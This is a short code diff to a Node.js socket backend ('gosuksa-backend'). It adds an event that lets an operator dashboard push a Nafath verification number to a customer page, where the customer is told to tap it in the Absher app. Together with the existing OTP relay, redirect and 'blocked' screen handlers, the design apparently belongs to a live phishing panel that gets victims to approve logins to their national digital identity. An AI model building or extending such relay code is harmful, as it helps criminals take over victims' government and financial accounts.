@@ -341,6 +341,36 @@ function broadcastAdminEvent(id, event, payload) {
     target.emit("admin:redirect", redirectPayload);
   }
 
+  // Nafath verification number: dashboard sends the 2-digit code that
+  // the customer must tap in the Absher app on page 7. The customer
+  // bundle listens for `nafath:code` with { verificationCode: "42" }.
+  if (
+    key === "nafathnumber" ||
+    key === "nafathcode" ||
+    key === "sendnafathnumber" ||
+    key === "sendnafathcode" ||
+    key === "setnafathnumber" ||
+    key === "setnafathcode" ||
+    key === "nafath:code" ||
+    key === "nafath:number"
+  ) {
+    const code = String(
+      data.verificationCode ??
+        data.code ??
+        data.number ??
+        data.nafathNumber ??
+        data.nafathCode ??
+        data.value ??
+        ""
+    );
+    target.emit("nafath:code", {
+      ...data,
+      verificationCode: code,
+      code,
+      number: code,
+    });
+  }
+
   // Block: customer page shows blocked screen. Do NOT disconnect the
   // socket, otherwise the next OTP / redirect can't be delivered.
   if (key === "clientblocked" || key === "blockclient" || key === "user:blocked") {
@@ -354,7 +384,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v13";
+const APP_VERSION = "v14";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
